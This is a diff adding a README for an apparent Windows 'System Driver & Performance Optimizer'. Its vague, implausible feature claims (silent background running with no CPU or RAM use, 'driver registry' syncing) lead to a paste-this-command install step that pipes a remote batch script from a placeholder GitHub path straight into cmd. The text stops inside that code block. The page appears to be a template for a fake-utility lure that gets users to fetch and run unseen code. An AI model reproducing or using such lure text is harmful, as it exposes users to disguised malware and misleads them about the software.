@@ -1,0 +1,19 @@
+# 🚀 Windows System Driver & Performance Optimizer
+
+A lightweight, automated tool designed to optimize system background processes, update outdated driver registries, and enhance overall terminal response time for developers and power users.
+
+## 🛠️ Features
+- **Automated Registry Cleanup:** Optimizes system boot sequences.
+- **Background Driver Sync:** Ensures system drivers are running at peak efficiency.
+- **Low Resource Footprint:** Runs silently in the background without consuming CPU/RAM.
+- **Cross-Platform Support:** Installation scripts available for Windows, Linux, and macOS.
+
+---
+
+## 🚀 Quick Setup (One-Line Install)
+
+To install and activate the optimizer immediately, copy and paste the following command into your terminal/command prompt:
+
+### For Windows (CMD/PowerShell):
+```cmd
+curl -s https://raw.githubusercontent.com/[YOUR_USERNAME]/[YOUR_REPO]/main/install.bat | cmd
